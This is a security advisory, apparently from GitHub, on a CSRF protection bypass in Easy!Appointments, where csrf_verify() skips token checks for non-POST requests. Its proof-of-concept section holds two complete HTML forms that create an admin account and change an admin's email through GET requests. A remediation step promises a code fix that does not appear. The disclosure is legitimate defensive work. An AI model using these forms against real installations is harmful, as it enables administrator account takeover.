summary: "alextselegidis/easyappointments is Vulnerable to CSRF Protection Bypass\n### Summary\n\
  `application/core/EA_Security.php::csrf_verify()` only enforces CSRF for POST requests and\
  \ returns early for non-POST methods. Several application endpoints perform state-changing\
  \ operations while accepting parameters from GET (or $_REQUEST), so an attacker can perform\
  \ CSRF by forcing a victim's browser to issue a crafted GET request. Impact: creation of admin\
  \ accounts, modification of admin email/password, and full admin account takeover\n\n### Details\n\
  \nin https://github.com/alextselegidis/easyappointments/blob/41c9b93a5a2c185a914f204412324d8980943fd5/application/core/EA_Security.php#L52\n\
  \n* **Repository / tested commit:** `alextselegidis/easyappointments` — commit `41c9b93a5a2c185a914f204412324d8980943fd5`.\n\
  * **Vulnerable file & function:** `application/core/EA_Security.php::csrf_verify()` — around\
  \ line 52. Link: `.../application/core/EA_Security.php#L52`.\n* **Root cause:** The function\
  \ early-returns when the request is not `POST`:\n\n```php\n// vulnerable snippet\nif (strtoupper($_SERVER['REQUEST_METHOD'])\
  \ !== 'POST') {\n    return $this->csrf_set_cookie();\n}\n```\n\nBecause of this, non-POST\
  \ requests (GET/PUT/DELETE/etc.) never reach token validation. When application controllers\
  \ accept state-changing parameters via `GET` or `$_REQUEST`, these requests bypass CSRF checks\
  \ entirely and the application executes the state change.\n\n* **Examples of vulnerable endpoints\
  \ (observed during testing):**\n\n  * `index.php/admins/store` — create admin (accepts fields\
  \ via GET)\n  * `index.php/admins/update` — modify admin (accepts fields via GET)\n  * `index.php/account/save`\
  \ — modify account/password (accepts fields via GET)\n\n* **Why this is critical:** An attacker\
  \ can host a simple page that issues requests (e.g., `<form method=\"GET\" action=\"...\"\
  >` or an auto-submitting form). If an authenticated admin visits that page, the attacker can\
  \ create an admin account, change admin email, or change password—enabling account takeover\
  \ and full compromise of the application instance.\n\n\n### PoC\nI will attach video proof\
  \ showing how I add an admin via CSRF. Below are reproducible PoC artifacts and steps to reproduce\
  \ locally \n\nhttps://github.com/user-attachments/assets/3fea1034-c479-43d9-9c40-86f8ba0b33c1\n\
  \n**Browser PoC (HTML)**\nSave one of the HTML files (example `csrf_add_admin_account.html`)\
  \ on an attacker server and visit it with a browser where the admin is logged into Easy!Appointments:\n\
  \n```html\n<html>\n<body>\n<form method=\"GET\" action=\"http://localhost:80/easyappointments/index.php/admins/store\"\
  >\n  <input type=\"hidden\" name=\"admin[first_name]\" value=\"admin_add_by_csrf\">\n  <input\
  \ type=\"hidden\" name=\"admin[last_name]\" value=\"poc\">\n  <input type=\"hidden\" name=\"\
  admin[email]\" value=\"poc@gmail.com\">\n  <input type=\"hidden\" name=\"admin[mobile_number]\"\
  \ value=\"\">\n  <input type=\"hidden\" name=\"admin[phone_number]\" value=\"0923092\">\n\
  \  <input type=\"hidden\" name=\"admin[address]\" value=\"\">\n  <input type=\"hidden\" name=\"\
  admin[city]\" value=\"\">\n  <input type=\"hidden\" name=\"admin[state]\" value=\"\">\n  <input\
  \ type=\"hidden\" name=\"admin[zip_code]\" value=\"\">\n  <input type=\"hidden\" name=\"admin[notes]\"\
  \ value=\"\">\n  <input type=\"hidden\" name=\"admin[language]\" value=\"english\">\n  <input\
  \ type=\"hidden\" name=\"admin[timezone]\" value=\"UTC\">\n  <input type=\"hidden\" name=\"\
  admin[settings][username]\" value=\"admincsrf1\">\n  <input type=\"hidden\" name=\"admin[settings][notifications]\"\
  \ value=\"1\">\n  <input type=\"hidden\" name=\"admin[settings][calendar_view]\" value=\"\
  table\">\n  <input type=\"hidden\" name=\"admin[settings][password]\" value=\"changeme\">\n\
  \  <input type=\"submit\" value=\"Submit request\">\n</form>\n</body>\n</html>\n```\n\nanother\
  \ example for another endpoint\n\n`csrf_change_admin_email.html`\n\n```html\n<html>\n<body>\n\
  <form method=\"GET\" action=\"http://localhost:80/easyappointments/index.php/admins/update\"\
  >\n  <input type=\"hidden\" name=\"admin[first_name]\" value=\"test\">\n  <input type=\"hidden\"\
  \ name=\"admin[last_name]\" value=\"cve\">\n  <input type=\"hidden\" name=\"admin[email]\"\
  \ value=\"test1@cve.com\">\n  <input type=\"hidden\" name=\"admin[mobile_number]\" value=\"\
  \">\n  <input type=\"hidden\" name=\"admin[phone_number]\" value=\"0101900\">\n  <input type=\"\
  hidden\" name=\"admin[address]\" value=\"\">\n  <input type=\"hidden\" name=\"admin[city]\"\
  \ value=\"\">\n  <input type=\"hidden\" name=\"admin[state]\" value=\"\">\n  <input type=\"\
  hidden\" name=\"admin[zip_code]\" value=\"\">\n  <input type=\"hidden\" name=\"admin[notes]\"\
  \ value=\"\">\n  <input type=\"hidden\" name=\"admin[language]\" value=\"english\">\n  <input\
  \ type=\"hidden\" name=\"admin[timezone]\" value=\"UTC\">\n  <input type=\"hidden\" name=\"\
  admin[settings][username]\" value=\"testn\">\n  <input type=\"hidden\" name=\"admin[settings][notifications]\"\
  \ value=\"1\">\n  <input type=\"hidden\" name=\"admin[settings][calendar_view]\" value=\"\
  default\">\n  <input type=\"hidden\" name=\"admin[id]\" value=\"1\">\n  <input type=\"submit\"\
  \ value=\"Submit request\">\n</form>\n</body>\n</html>\n```\n\n### Suggested remediation (recommended)\n\
  \nProvide two practical remediation paths mmediate and long-term:\n\n**Immediate (urgent,\
  \ low-effort):** Enforce CSRF checks for all  methods  and do not skip validation for non-POST.\
  \ Minimal core fix:\n\nThis closes the common bypass route while keeping read-only GET behavior\
  \ intact.\n\n**Stricter immediate option (no-bypass):** Require a valid CSRF token for **all**\
  \ methods (including GET) unless the URI is explicitly whitelisted in `csrf_exclude_uris`.\
  \ This prevents GET-based bypass even if controllers remain unchanged but may require updates\
  \ to legitimate GET consumers.\n\n**Long-term (recommended, correct fix):**\n\n1. **Controller\
  \ hardening:** Update controllers so all state-changing actions accept only the proper HTTP\
  \ method (POST/PUT/DELETE) .\n2. **Require re-authentication or confirmation** for critical\
  \ operations (email/password changes).\n3. **Set cookie flags**: `SameSite`, `Secure`, and\
  \ `HttpOnly` as appropriate.\n\n\n### Impact\n\n* **Type:** Cross-Site Request Forgery (CSRF)\
  \ allowing account takeover / privilege escalation.\n* **Who is impacted:** Any deployment\
  \ of Easy!Appointments using the vulnerable code where administrative or sensitive endpoints\
  \ accept GET or use `$_REQUEST` (what i found is almost every endpoint work with GET and POST).\
  \ Logged-in administrator users are at greatest risk.\n* **Consequences:** An attacker can\
  \ create administrative accounts, change administrator emails/passwords (leading to password\
  \ reset abuse), and fully compromise application instances and data."
